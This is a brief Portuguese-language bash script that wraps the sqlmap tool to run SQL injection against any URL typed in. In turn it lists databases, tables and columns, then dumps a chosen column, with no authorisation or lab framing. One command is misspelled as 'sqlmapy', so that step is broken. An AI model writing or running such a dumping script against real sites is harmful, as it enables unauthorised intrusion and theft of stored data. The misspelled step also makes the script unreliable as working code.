#!/bin/bash
# https://github.com/EdSec

echo '''
 :::::::::::::::::::::::::::::::::::::

 [+] Script >sqlmap automatico<

 [+] Coded by: EdSec

 :::::::::::::::::::::::::::::::::::::

'''

echo " [+] DIGITE A URL PARA O SQLMAP"
read -p " [+]>> " url

sqlmap -u $url --risk 2 --level 2 --dbs

echo " [+] DIGITE O NOME DO BANCO DE DADOS"
read -p " [+]>> " db

sqlmap -u $url --risk 2 --level 2 -D $db --tables

echo " [+] DIGITE O NOME DA TABELA"
read -p " [+]>> " tabela

sqlmapy -u $url --risk 2 --level 2 -D $db -T $tabela --columns

echo " [+] DIGITE O NOME DA COLUNA"
read -p "[+]>> " coluna

sqlmap -u $url --risk 2 --level 2 -D $db -T $tabela -C $coluna --dump
